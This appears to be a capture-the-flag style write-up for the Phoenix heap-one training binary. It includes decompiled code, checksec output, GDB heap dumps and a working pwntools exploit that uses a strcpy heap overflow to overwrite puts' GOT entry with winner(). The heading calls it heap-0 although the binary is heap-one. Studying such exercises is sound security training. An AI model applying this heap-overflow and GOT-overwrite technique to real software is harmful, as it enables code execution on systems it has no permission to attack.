# &#35; heap-0

#### &#42; pseudocode using ghidra
```bash


undefined4 main(undefined4 param_1,int param_2)

{
  undefined4 *puVar1;
  void *pvVar2;
  undefined4 *puVar3;
  
  puVar1 = (undefined4 *)malloc(8);
  *puVar1 = 1;
  pvVar2 = malloc(8);
  puVar1[1] = pvVar2;
  puVar3 = (undefined4 *)malloc(8);
  *puVar3 = 2;
  pvVar2 = malloc(8);
  puVar3[1] = pvVar2;
  strcpy((char *)puVar1[1],*(char **)(param_2 + 4));
  strcpy((char *)puVar3[1],*(char **)(param_2 + 8));
  puts("and that\'s a wrap folks!");
  return 0;
}


void winner(void)

{
  time_t tVar1;
  
  tVar1 = time((time_t *)0x0);
  printf("Congratulations, you\'ve completed this level @ %ld seconds past the Epoch\n",tVar1);
  return;
}


$ objdump -t /opt/phoenix/i486/heap-one | grep winner
0804889a g     F .text	00000027 winner


```


#### &#42; check to binary
```bash
$ file /opt/phoenix/i486/heap-one
/opt/phoenix/i486/heap-one: setuid, setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV),
  dynamically linked, interpreter /opt/phoenix/i486-linux-musl/lib/ld-musl-i386.so.1, not stripped

$ checksec /opt/phoenix/i486/heap-one
[*] '/opt/phoenix/i486/heap-one'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
    RPATH:    '/opt/phoenix/i486-linux-musl/lib'

```



#### &#42; how it work
```bash
$ /opt/phoenix/i486/heap-one AAAAAAA
Segmentation fault
$

$ /opt/phoenix/i486/heap-one AAAAAAA BBBBBBBB
and that's a wrap folks!

```


#### &#42; vulnerable point
```bash
#### we can overwrite puts.got using strcpy())
```


#### &#42; heap structure
#### {idx[4] + data_ptr[4] + prev[4] + size[4] + data[16]}
#### {idx[4] + data_ptr[4] + prev[4] + size[4] + data[16]}
```bash

$ gdb /opt/phoenix/i486/heap-one -q
GEF for linux ready, type `gef' to start, `gef config' to configure
71 commands loaded for GDB 8.2.1 using Python engine 3.5
[*] 2 commands could not be loaded, run `gef missing` to know why.
Reading symbols from /opt/phoenix/i486/heap-one...(no debugging symbols found)...done.
gef> disas main
Dump of assembler code for function main:
   0x080487d5 <+0>:	lea    ecx,[esp+0x4]
   0x080487d9 <+4>:	and    esp,0xfffffff0
   0x080487dc <+7>:	push   DWORD PTR [ecx-0x4]
   0x080487df <+10>:	push   ebp
   0x080487e0 <+11>:	mov    ebp,esp
   0x080487e2 <+13>:	push   ebx
   0x080487e3 <+14>:	push   ecx
   0x080487e4 <+15>:	sub    esp,0x10
   0x080487e7 <+18>:	mov    ebx,ecx
   0x080487e9 <+20>:	sub    esp,0xc
   0x080487ec <+23>:	push   0x8
   0x080487ee <+25>:	call   0x80490dc <malloc>
   0x080487f3 <+30>:	add    esp,0x10
   0x080487f6 <+33>:	mov    DWORD PTR [ebp-0xc],eax
   0x080487f9 <+36>:	mov    eax,DWORD PTR [ebp-0xc]
   0x080487fc <+39>:	mov    DWORD PTR [eax],0x1
   0x08048802 <+45>:	sub    esp,0xc
   0x08048805 <+48>:	push   0x8
   0x08048807 <+50>:	call   0x80490dc <malloc>
   0x0804880c <+55>:	add    esp,0x10
   0x0804880f <+58>:	mov    edx,eax
   0x08048811 <+60>:	mov    eax,DWORD PTR [ebp-0xc]
   0x08048814 <+63>:	mov    DWORD PTR [eax+0x4],edx
   0x08048817 <+66>:	sub    esp,0xc
   0x0804881a <+69>:	push   0x8
   0x0804881c <+71>:	call   0x80490dc <malloc>
   0x08048821 <+76>:	add    esp,0x10
   0x08048824 <+79>:	mov    DWORD PTR [ebp-0x10],eax
   0x08048827 <+82>:	mov    eax,DWORD PTR [ebp-0x10]
   0x0804882a <+85>:	mov    DWORD PTR [eax],0x2
   0x08048830 <+91>:	sub    esp,0xc
   0x08048833 <+94>:	push   0x8
   0x08048835 <+96>:	call   0x80490dc <malloc>
   0x0804883a <+101>:	add    esp,0x10
   0x0804883d <+104>:	mov    edx,eax
   0x0804883f <+106>:	mov    eax,DWORD PTR [ebp-0x10]
   0x08048842 <+109>:	mov    DWORD PTR [eax+0x4],edx
   0x08048845 <+112>:	mov    eax,DWORD PTR [ebx+0x4]
   0x08048848 <+115>:	add    eax,0x4
   0x0804884b <+118>:	mov    edx,DWORD PTR [eax]
   0x0804884d <+120>:	mov    eax,DWORD PTR [ebp-0xc]
   0x08048850 <+123>:	mov    eax,DWORD PTR [eax+0x4]
   0x08048853 <+126>:	sub    esp,0x8
   0x08048856 <+129>:	push   edx
   0x08048857 <+130>:	push   eax
   0x08048858 <+131>:	call   0x8048560 <strcpy@plt>
   0x0804885d <+136>:	add    esp,0x10
   0x08048860 <+139>:	mov    eax,DWORD PTR [ebx+0x4]
   0x08048863 <+142>:	add    eax,0x8
   0x08048866 <+145>:	mov    edx,DWORD PTR [eax]
   0x08048868 <+147>:	mov    eax,DWORD PTR [ebp-0x10]
   0x0804886b <+150>:	mov    eax,DWORD PTR [eax+0x4]
   0x0804886e <+153>:	sub    esp,0x8
   0x08048871 <+156>:	push   edx
   0x08048872 <+157>:	push   eax
   0x08048873 <+158>:	call   0x8048560 <strcpy@plt>
   0x08048878 <+163>:	add    esp,0x10
   0x0804887b <+166>:	sub    esp,0xc
   0x0804887e <+169>:	push   0x804ab70
   0x08048883 <+174>:	call   0x80485b0 <puts@plt>
   0x08048888 <+179>:	add    esp,0x10
   0x0804888b <+182>:	mov    eax,0x0
   0x08048890 <+187>:	lea    esp,[ebp-0x8]
   0x08048893 <+190>:	pop    ecx
   0x08048894 <+191>:	pop    ebx
   0x08048895 <+192>:	pop    ebp
   0x08048896 <+193>:	lea    esp,[ecx-0x4]
   0x08048899 <+196>:	ret
End of assembler dump.
gef>

gef> p winner
$1 = {<text variable, no debug info>} 0x804889a <winner>


gef> b *0x080487ee
Breakpoint 1 at 0x80487ee
gef> r AAAAAAAAAA BBBBBBBBBB


gef> x/8xw 0xf7e69008
0xf7e69008:	0x00000000	0x00000000	0x00000000	0x000ffff1
0xf7e69018:	0x00000000	0x00000000	0x00000000	0x00000000
gef>

gef> x/8xw 0xf7e69018
0xf7e69018:	0x00000000	0x00000000	0x00000000	0x000fffe1
0xf7e69028:	0x00000000	0x00000000	0x00000000	0x00000000
gef>

gef> x/8xw 0xf7e69028
0xf7e69028:	0x00000000	0x00000000	0x00000000	0x000fffd1
0xf7e69038:	0x00000000	0x00000000	0x00000000	0x000fffc1

gef> x/8xw 0xf7e69038
0xf7e69038:	0x00000000	0x00000000	0x00000000	0x000fffc1
0xf7e69048:	0x00000000	0x00000000	0x00000000	0x00000000
gef>


gef> x/32xw 0xf7e69008
0xf7e69008:	0x00000001	0xf7e69018	0x00000000	0x00000011
0xf7e69018:	0x41414141	0x41414141	0x00004141	0x00000011
0xf7e69028:	0x00000002	0xf7e69038	0x00000000	0x00000011
0xf7e69038:	0x42424242	0x42424242	0x00004242	0x000fffc1
0xf7e69048:	0x00000000	0x00000000	0x00000000	0x00000000
0xf7e69058:	0x00000000	0x00000000	0x00000000	0x00000000
0xf7e69068:	0x00000000	0x00000000	0x00000000	0x00000000
0xf7e69078:	0x00000000	0x00000000	0x00000000	0x00000000
gef>

gef> x/i 0x804c140
   0x804c140 <puts@got.plt>:	out    dx,al

gef> p winner
$2 = {<text variable, no debug info>} 0x804889a <winner>
gef>



```

#### &#42; payload
```bash
#### {idx[4] + data_ptr[4] + prev[4] + size[4] + data[16]}
#### {idx[4] + data_ptr[4] + prev[4] + size[4] + data[16]}
#### second data_ptr[4] is modifiable.
payload1  = b""
payload1 += b"A"*20
payload1 += p32(puts_got)

payload2  = b""
payload2 += p32(winner)

```

#### &#42; exploit code
```bash
$ cat exp_heap1.py
from pwn import *

context.arch='i386'
#context.log_level='debug'

filename="/opt/phoenix/i486/heap-one"
conn = process(filename)

elf = ELF(filename)
puts_got = elf.got["puts"]
winner = elf.symbols["winner"]

payload1  = b""
payload1 += b"A"*20
payload1 += p32(puts_got)

payload2  = b""
payload2 += p32(winner)

conn = process([filename, payload1, payload2])
print( conn.recvline() )

conn.interactive()



$ python exp_heap1.py
[+] Starting local process '/opt/phoenix/i486/heap-one': pid 2776
[*] '/opt/phoenix/i486/heap-one'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
    RPATH:    '/opt/phoenix/i486-linux-musl/lib'
[+] Starting local process '/opt/phoenix/i486/heap-one': pid 2782
[*] Process '/opt/phoenix/i486/heap-one' stopped with exit code 0 (pid 2782)
Congratulations, you've completed this level @ 1638328120 seconds past the Epoch

[*] Switching to interactive mode
[*] Got EOF while reading in interactive
$
```


